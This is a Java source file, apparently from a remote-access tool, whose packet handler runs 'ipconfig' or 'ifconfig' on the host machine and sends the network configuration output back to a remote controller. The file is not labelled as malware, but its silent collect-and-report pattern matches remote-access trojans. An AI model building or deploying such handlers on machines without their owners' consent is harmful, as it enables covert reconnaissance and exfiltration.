package com.redpois0n.packets.in;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import com.redpois0n.Connection;
import com.redpois0n.common.OperatingSystem;
import com.redpois0n.packets.out.Header;


public class PacketIPCONFIG extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS || OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
			PacketBuilder packet = new PacketBuilder(Header.IP_CONFIG);
			
			Process p = Runtime.getRuntime().exec(OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS ? "ipconfig" : "ifconfig");
			BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
			int n = 0;
			while (true) {
				String line = reader.readLine();
				if (n > 5) {
					break;
				}
				if (line == null) {
					packet.add(" ");
					n++;
				} else {
					packet.add(line);
					n = 0;
				}
			}
			reader.close();
			packet.add("END");
			
			Connection.addToSendQueue(packet);
		}
	}

}
